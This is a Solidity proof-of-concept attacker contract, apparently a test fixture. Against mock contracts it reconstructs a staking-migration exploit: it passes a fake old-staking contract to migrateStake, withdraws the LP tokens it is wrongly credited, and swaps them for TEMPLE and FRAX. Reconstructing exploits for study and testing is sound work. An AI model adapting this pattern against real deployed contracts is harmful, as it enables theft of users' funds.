// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {FakeOldStaking} from "./FakeOldStaking.sol";
import {MockERC20} from "./MockERC20.sol";
import {MockTempleFraxPair} from "./MockTempleFraxPair.sol";
import {TempleStaxMigrationMockV2} from "./TempleStaxMigrationMockV2.sol";

contract TempleMigrationAttackerV2 {
    TempleStaxMigrationMockV2 public immutable STAKING;
    MockTempleFraxPair public immutable PAIR;
    MockERC20 public immutable LP_TOKEN;
    MockERC20 public immutable TEMPLE;
    MockERC20 public immutable FRAX;
    FakeOldStaking public fakeOldStaking;

    constructor(address staking_, address pair_, address lpToken_, address temple_, address frax_) {
        STAKING = TempleStaxMigrationMockV2(staking_);
        PAIR = MockTempleFraxPair(pair_);
        LP_TOKEN = MockERC20(lpToken_);
        TEMPLE = MockERC20(temple_);
        FRAX = MockERC20(frax_);
    }

    function stageFakeMigration(uint256 amount) external {
        fakeOldStaking = new FakeOldStaking();
        STAKING.migrateStake(address(fakeOldStaking), amount);
    }

    function withdrawLp() external {
        STAKING.withdrawAll(false);
    }

    function swapLpToTempleFrax(uint256 lpAmount) external {
        LP_TOKEN.approve(address(PAIR), lpAmount);
        PAIR.swapLpForUnderlying(lpAmount);
    }

    function balances() external view returns (uint256 lp, uint256 templeBal, uint256 fraxBal) {
        return (LP_TOKEN.balanceOf(address(this)), TEMPLE.balanceOf(address(this)), FRAX.balanceOf(address(this)));
    }
}
